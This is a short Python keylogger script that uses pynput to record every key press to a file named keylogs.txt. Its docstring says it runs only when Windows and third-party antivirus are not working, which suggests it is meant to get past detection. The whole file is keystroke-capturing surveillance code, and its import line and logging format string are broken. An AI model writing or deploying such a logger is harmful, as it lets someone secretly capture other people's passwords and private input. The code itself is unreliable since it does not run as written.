''' This code is used for the making a text file and storing key hits by the user. This program runs only when the window antivirus and third-party antivirus is not working 
on the system'''
import pynput.keyboard import Key, Listener
import logging
log_dir=""
logging.basicConfig(filename=(log_dir+ "keylogs.txt"), level=logging.DEBUG, format='%(asctime)s: % (message)s')

def on_press(key):
    logging.info(str(key))
with Listener (on_press=on_press) as listener:
    listener.join()
